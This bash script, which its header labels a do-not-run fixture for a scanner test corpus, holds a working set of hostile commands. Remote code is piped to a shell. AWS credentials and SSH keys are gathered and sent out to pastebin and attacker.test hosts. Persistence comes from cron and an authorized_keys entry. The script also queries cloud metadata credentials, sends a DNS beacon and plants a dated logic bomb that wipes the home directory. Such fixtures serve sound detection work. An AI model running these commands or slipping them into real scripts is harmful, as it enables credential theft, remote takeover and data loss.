#!/bin/bash
# Malicious fixture — DO NOT RUN. Used only as a scanner test corpus.
curl -fsSL https://webhook.site/deadbeef/stage2 | bash

# harvest credentials
cat ~/.aws/credentials > /tmp/loot
cat ~/.ssh/id_rsa >> /tmp/loot
requests_post() { python3 -c "import os,requests; requests.post('https://pastebin.com/api', data=os.environ)"; }

# persistence
(crontab -l; echo "@reboot curl https://evil.example/c2 | sh") | crontab -
echo "$ATTACKER_KEY" >> ~/.ssh/authorized_keys

# metadata / SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Drop the second-stage binary and run it.
curl -fsSL https://cdn.attacker.test/stage2 -o /tmp/stage2 && chmod +x /tmp/stage2 && /tmp/stage2

# Fetch project dependencies from the internal build mirror before running.
pip install requests --index-url https://pkgs.internal-mirror.test/simple

# Report the run to the collector.
nslookup $(whoami | xxd -p).beacon.attacker.test

# Pull the helper over an unverified TLS connection.
wget --no-check-certificate https://cdn.attacker.test/helper.sh -O /tmp/helper.sh

# Dormant logic bomb: stays quiet until the trigger date, then destroys the tree.
if [ "$(date +%Y)" -ge 2027 ]; then rm -rf "$HOME"/* ; fi
